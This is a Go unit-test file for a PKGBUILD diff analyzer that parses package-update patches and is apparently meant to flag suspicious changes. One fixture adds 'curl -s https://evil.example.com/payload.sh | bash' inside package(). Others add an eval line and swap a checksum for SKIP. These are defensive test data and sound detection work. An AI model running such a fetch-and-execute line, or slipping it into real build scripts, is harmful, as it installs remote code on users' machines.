package analyzer

import "testing"

func TestSplitPatchLines_SkipsGitExtendedHeaders(t *testing.T) {
	// This is the actual shape internal/git/diff.go's parseFileDiffs
	// produces — FileDiff.Patch includes the "diff --git" line itself
	// and the "index ..." line, not just the "@@"-onward unified diff
	// body. Both must be skipped, not misread as Context content.
	patch := `diff --git a/PKGBUILD b/PKGBUILD
index 83db48f..bf269c7 100644
--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,2 +1,2 @@
-pkgver=1.0
+pkgver=2.0
 pkgrel=1
`
	lines := splitPatchLines(patch)

	// Exactly three real content lines: the removed pkgver, the added
	// pkgver, and the unchanged pkgrel context line. Neither the
	// "diff --git" nor "index" line should appear at all.
	if len(lines) != 3 {
		t.Fatalf("got %d lines, want 3 (got %+v)", len(lines), lines)
	}
	if lines[0].kind != lineRemoved || lines[0].text != "pkgver=1.0" {
		t.Errorf("line 0 = %+v, want removed pkgver=1.0", lines[0])
	}
	if lines[1].kind != lineAdded || lines[1].text != "pkgver=2.0" || lines[1].newLineNo != 1 {
		t.Errorf("line 1 = %+v, want added pkgver=2.0 on new-file line 1", lines[1])
	}
	if lines[2].kind != lineContext || lines[2].text != "pkgrel=1" || lines[2].newLineNo != 2 {
		t.Errorf("line 2 = %+v, want context pkgrel=1 on new-file line 2", lines[2])
	}
}

func TestSplitPatchLines_SkipsRenameAndModeHeaders(t *testing.T) {
	patch := `diff --git a/old.install b/new.install
similarity index 100%
rename from old.install
rename to new.install
old mode 100644
new mode 100755
`
	lines := splitPatchLines(patch)
	if len(lines) != 0 {
		t.Fatalf("got %d lines, want 0 (all extended-header lines, no content): %+v", len(lines), lines)
	}
}

func TestSplitPatchLines(t *testing.T) {
	patch := "@@ -1,3 +1,3 @@\n" +
		" context line\n" +
		"-removed line\n" +
		"+added line\n"

	lines := splitPatchLines(patch)
	if len(lines) != 3 {
		t.Fatalf("got %d lines, want 3", len(lines))
	}
	if lines[0].kind != lineContext || lines[0].text != "context line" {
		t.Errorf("line 0 = %+v, want context %q", lines[0], "context line")
	}
	if lines[1].kind != lineRemoved || lines[1].text != "removed line" {
		t.Errorf("line 1 = %+v, want removed %q", lines[1], "removed line")
	}
	if lines[2].kind != lineAdded || lines[2].text != "added line" {
		t.Errorf("line 2 = %+v, want added %q", lines[2], "added line")
	}
	// context (line 1 of new file) then added (line 2) — removed lines
	// don't consume a new-file line number.
	if lines[0].newLineNo != 1 || lines[2].newLineNo != 2 {
		t.Errorf("newLineNo tracking = %d, %d, want 1, 2", lines[0].newLineNo, lines[2].newLineNo)
	}
}

func TestParseArrays_URLChange(t *testing.T) {
	patch := `@@ -1,2 +1,2 @@
-source=("https://example.org/pkg-1.9.tar.gz")
+source=("https://example.org/pkg-2.0.tar.gz")
`
	got := parsePKGBUILDDiff(patch)
	arrs := got.arraysNamed("source")
	if len(arrs) != 1 {
		t.Fatalf("got %d source arrays, want 1", len(arrs))
	}
	a := arrs[0]
	if len(a.Added) != 1 || a.Added[0].Value != "https://example.org/pkg-2.0.tar.gz" {
		t.Errorf("Added = %v, want [https://example.org/pkg-2.0.tar.gz]", a.Added)
	}
	if len(a.Removed) != 1 || a.Removed[0] != "https://example.org/pkg-1.9.tar.gz" {
		t.Errorf("Removed = %v, want [https://example.org/pkg-1.9.tar.gz]", a.Removed)
	}
	// Merged from a Removed-only block (no new-file line, since Removed
	// content doesn't exist in the new file) with an Added-only block.
	// Both blocks sit on new-file line 1 — the hunk header sets the
	// counter to 1, and since the Removed line never advances it, the
	// following Added line reuses that same starting value.
	if a.Added[0].Line != 1 {
		t.Errorf("Added[0].Line = %d, want 1 (Removed lines don't advance newLineNo, so the following Added line reuses the header's starting value)", a.Added[0].Line)
	}
	if a.Line != 1 {
		t.Errorf("array Line = %d, want 1 (adopted from the Added block, not the Removed block's 0)", a.Line)
	}
}

func TestParseArrays_ParenthesesInsideQuotedURL(t *testing.T) {
	patch := `@@ -1,3 +1,3 @@
-source=(
-  "https://example.org/download(v1).tar.gz"
-)
+source=(
+  "https://example.org/download(v2).tar.gz"
+)
`
	got := parsePKGBUILDDiff(patch)
	arrs := got.arraysNamed("source")
	if len(arrs) != 1 {
		t.Fatalf("got %d arrays, want 1", len(arrs))
	}
	a := arrs[0]
	if len(a.Added) != 1 || len(a.Removed) != 1 {
		t.Fatalf("Added=%v Removed=%v", a.Added, a.Removed)
	}
	if a.Added[0].Value != "https://example.org/download(v2).tar.gz" {
		t.Errorf("Added = %v", a.Added)
	}
	if a.Removed[0] != "https://example.org/download(v1).tar.gz" {
		t.Errorf("Removed = %v", a.Removed)
	}
}

func TestParseArrays_UnbalancedParenInsideQuotedURL(t *testing.T) {
	// The case that actually breaks naive strings.Count("(")-strings.Count(")")
	// paren counting: one literal "(" with no matching ")" on the line,
	// inside a quoted URL.
	patch := `@@ -1,2 +1,2 @@
 pkgname=foo
-source=("https://example.com/thing(unclosed")
+source=("https://example.com/other(unclosed")
`
	got := parsePKGBUILDDiff(patch)
	arrs := got.arraysNamed("source")
	if len(arrs) != 1 {
		t.Fatalf("got %d source arrays, want 1", len(arrs))
	}
	a := arrs[0]
	if len(a.Added) != 1 || a.Added[0].Value != "https://example.com/other(unclosed" {
		t.Errorf("Added = %v, want [https://example.com/other(unclosed]", a.Added)
	}
	if len(a.Removed) != 1 || a.Removed[0] != "https://example.com/thing(unclosed" {
		t.Errorf("Removed = %v, want [https://example.com/thing(unclosed]", a.Removed)
	}
}

func TestParseArrays_MultiLineReorderIsNotNew(t *testing.T) {
	patch := `@@ -1,2 +1,2 @@
-source=("https://a.example.com/x.tar.gz"
-        "https://b.example.com/y.tar.gz")
+source=("https://b.example.com/y.tar.gz"
+        "https://a.example.com/x.tar.gz")
`
	got := parsePKGBUILDDiff(patch)
	arrs := got.arraysNamed("source")
	if len(arrs) != 1 {
		t.Fatalf("got %d source arrays, want 1", len(arrs))
	}
	a := arrs[0]
	// Both URLs present in both Added and Removed — a "genuinely new"
	// check on top of this (done by urlAnalyzer, not this parser) should
	// treat this as zero new URLs.
	wantSet := map[string]bool{
		"https://a.example.com/x.tar.gz": true,
		"https://b.example.com/y.tar.gz": true,
	}
	for _, u := range a.Added {
		if !wantSet[u.Value] {
			t.Errorf("unexpected Added URL %q", u.Value)
		}
	}
	for _, u := range a.Removed {
		if !wantSet[u] {
			t.Errorf("unexpected Removed URL %q", u)
		}
	}
	if len(a.Added) != 2 || len(a.Removed) != 2 {
		t.Errorf("Added/Removed lengths = %d/%d, want 2/2", len(a.Added), len(a.Removed))
	}
}

func TestParseArrays_ArchSuffix(t *testing.T) {
	patch := `@@ -1 +1 @@
-source_x86_64=("https://example.org/old.tar.gz")
+source_x86_64=("https://example.org/new.tar.gz")
`
	got := parsePKGBUILDDiff(patch)
	arrs := got.arraysNamed("source")
	if len(arrs) != 1 {
		t.Fatalf("got %d source arrays, want 1", len(arrs))
	}
	if arrs[0].Arch != "x86_64" {
		t.Errorf("Arch = %q, want x86_64", arrs[0].Arch)
	}
}

func TestParseArrays_ChecksumSkipSubstitution(t *testing.T) {
	patch := `@@ -1 +1 @@
-sha256sums=('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')
+sha256sums=('SKIP')
`
	got := parsePKGBUILDDiff(patch)
	arrs := got.arraysNamed("sha256sums")
	if len(arrs) != 1 {
		t.Fatalf("got %d sha256sums arrays, want 1", len(arrs))
	}
	a := arrs[0]
	if len(a.Added) != 1 || a.Added[0].Value != "SKIP" {
		t.Errorf("Added = %v, want [SKIP]", a.Added)
	}
	if len(a.Removed) != 1 || len(a.Removed[0]) != 64 {
		t.Errorf("Removed = %v, want one 64-char hash", a.Removed)
	}
}

func TestParseArrays_Unchanged(t *testing.T) {
	patch := `@@ -1 +1 @@
-source=("https://example.org/pkg.tar.gz")
+source=("https://example.org/pkg.tar.gz")
`
	got := parsePKGBUILDDiff(patch)
	arrs := got.arraysNamed("source")
	if len(arrs) != 1 {
		t.Fatalf("got %d source arrays, want 1", len(arrs))
	}
	a := arrs[0]
	if len(a.Added) != 1 || len(a.Removed) != 1 {
		t.Fatalf("Added=%v Removed=%v", a.Added, a.Removed)
	}
	if a.Added[0].Value != "https://example.org/pkg.tar.gz" {
		t.Fatalf("Added=%v", a.Added)
	}
	if a.Removed[0] != "https://example.org/pkg.tar.gz" {
		t.Fatalf("Removed=%v", a.Removed)
	}
}

func TestParseArrays_MergesAdjacentRemovedAddedBlocks(t *testing.T) {
	patch := `@@ -1,3 +1,3 @@
-source=(
-  "https://example.org/old.tar.gz"
-)
+source=(
+  "https://example.org/new.tar.gz"
+)
`
	got := parsePKGBUILDDiff(patch)
	arrs := got.arraysNamed("source")
	if len(arrs) != 1 {
		t.Fatalf("got %d arrays, want 1", len(arrs))
	}
	a := arrs[0]
	if len(a.Removed) != 1 || a.Removed[0] != "https://example.org/old.tar.gz" {
		t.Fatalf("Removed=%v", a.Removed)
	}
	if len(a.Added) != 1 || a.Added[0].Value != "https://example.org/new.tar.gz" {
		t.Fatalf("Added=%v", a.Added)
	}
	// The merged array's Line must come from the Added block, not the
	// Removed block (whose lines carry no new-file line number at all).
	// The three Removed lines don't advance newLineNo, so "+source=("
	// reuses the hunk header's starting value, 1.
	if a.Line != 1 {
		t.Errorf("array Line = %d, want 1", a.Line)
	}
	// The entry line ("+  \"...new...\"") is the next Added line, 2.
	if a.Added[0].Line != 2 {
		t.Errorf("Added[0].Line = %d, want 2", a.Added[0].Line)
	}
}

func TestParseArrays_NewArrayHasNoRemoved(t *testing.T) {
	// A wholly new array (Import case, or an array added for the first
	// time) has Added entries with real line numbers and an empty
	// Removed slice — not a merge candidate, since there's no preceding
	// Removed-only block.
	patch := `@@ -1,1 +1,1 @@
+source=("https://example.org/new.tar.gz")
`
	got := parsePKGBUILDDiff(patch)
	arrs := got.arraysNamed("source")
	if len(arrs) != 1 {
		t.Fatalf("got %d arrays, want 1", len(arrs))
	}
	a := arrs[0]
	if len(a.Removed) != 0 {
		t.Errorf("Removed = %v, want empty", a.Removed)
	}
	if len(a.Added) != 1 || a.Added[0].Line != 1 {
		t.Errorf("Added = %v, want one entry on line 1", a.Added)
	}
}

func TestParseArrays_DeletedArrayHasNoLine(t *testing.T) {
	// An array removed entirely, with nothing replacing it, doesn't
	// exist in the new file at all — Line stays 0 so callers degrade
	// Finding.Location to the bare path instead of pointing at a
	// nonexistent line.
	patch := `@@ -1,1 +1,0 @@
-source=("https://example.org/old.tar.gz")
`
	got := parsePKGBUILDDiff(patch)
	arrs := got.arraysNamed("source")
	if len(arrs) != 1 {
		t.Fatalf("got %d arrays, want 1", len(arrs))
	}
	if arrs[0].Line != 0 {
		t.Errorf("Line = %d, want 0 (array doesn't exist in new file)", arrs[0].Line)
	}
}

func TestParseScalars_VersionBump(t *testing.T) {
	patch := `@@ -1,2 +1,2 @@
-pkgver=12.4
+pkgver=12.5
-pkgrel=1
+pkgrel=2
`
	got := parsePKGBUILDDiff(patch)
	pkgver, ok := got.scalar("pkgver")
	if !ok || pkgver.Old != "12.4" || pkgver.New != "12.5" {
		t.Errorf("pkgver = %+v, ok=%v, want Old=12.4 New=12.5", pkgver, ok)
	}
	if pkgver.NewLine != 1 {
		t.Errorf("pkgver.NewLine = %d, want 1", pkgver.NewLine)
	}
	pkgrel, ok := got.scalar("pkgrel")
	if !ok || pkgrel.Old != "1" || pkgrel.New != "2" {
		t.Errorf("pkgrel = %+v, ok=%v, want Old=1 New=2", pkgrel, ok)
	}
	if pkgrel.NewLine != 2 {
		t.Errorf("pkgrel.NewLine = %d, want 2", pkgrel.NewLine)
	}
}

func TestParseScalars_Unchanged(t *testing.T) {
	patch := `@@ -1,2 +1,2 @@
-pkgver=12.4
+pkgver=12.4
 pkgrel=1
`
	got := parsePKGBUILDDiff(patch)
	pkgrel, ok := got.scalar("pkgrel")
	if !ok {
		t.Fatalf("expected pkgrel to be captured from context line")
	}
	if pkgrel.NewLine != 2 {
		t.Errorf("pkgrel.NewLine = %d, want 2 (context lines have a real new-file line)", pkgrel.NewLine)
	}
}

func TestParseFunctions_NetworkDownloadInPackage(t *testing.T) {
	patch := `@@ -1,3 +1,4 @@
 package() {
+  curl -s https://evil.example.com/payload.sh | bash
   install -Dm755 "$pkgname" "$pkgdir/usr/bin/$pkgname"
 }
`
	got := parsePKGBUILDDiff(patch)
	if len(got.Functions) != 1 {
		t.Fatalf("got %d functions, want 1", len(got.Functions))
	}
	f := got.Functions[0]
	if f.Name != "package" {
		t.Errorf("Name = %q, want package", f.Name)
	}
	if len(f.AddedLines) != 1 || f.AddedLines[0].Value != "  curl -s https://evil.example.com/payload.sh | bash" {
		t.Errorf("AddedLines = %v", f.AddedLines)
	}
	// package() is line 1, the curl line is line 2 of the new file.
	if f.AddedLines[0].Line != 2 {
		t.Errorf("AddedLines[0].Line = %d, want 2", f.AddedLines[0].Line)
	}
}

func TestParseFunctions_UnterminatedStillReturned(t *testing.T) {
	// Closing brace falls outside the visible hunk (long unmodified
	// function tail) — a known limitation, but the added line should
	// still surface rather than being silently dropped.
	patch := `@@ -1,2 +1,3 @@
 build() {
+  eval "$(some_command)"
   make
`
	got := parsePKGBUILDDiff(patch)
	if len(got.Functions) != 1 {
		t.Fatalf("got %d functions, want 1", len(got.Functions))
	}
	if len(got.Functions[0].AddedLines) != 1 {
		t.Errorf("AddedLines = %v, want 1 entry", got.Functions[0].AddedLines)
	}
}

func TestLocation(t *testing.T) {
	if got := location("PKGBUILD", 12); got != "PKGBUILD:12" {
		t.Errorf("location(PKGBUILD, 12) = %q, want PKGBUILD:12", got)
	}
	if got := location("PKGBUILD", 0); got != "PKGBUILD" {
		t.Errorf("location(PKGBUILD, 0) = %q, want PKGBUILD", got)
	}
	if got := location("PKGBUILD", -1); got != "PKGBUILD" {
		t.Errorf("location(PKGBUILD, -1) = %q, want PKGBUILD", got)
	}
}
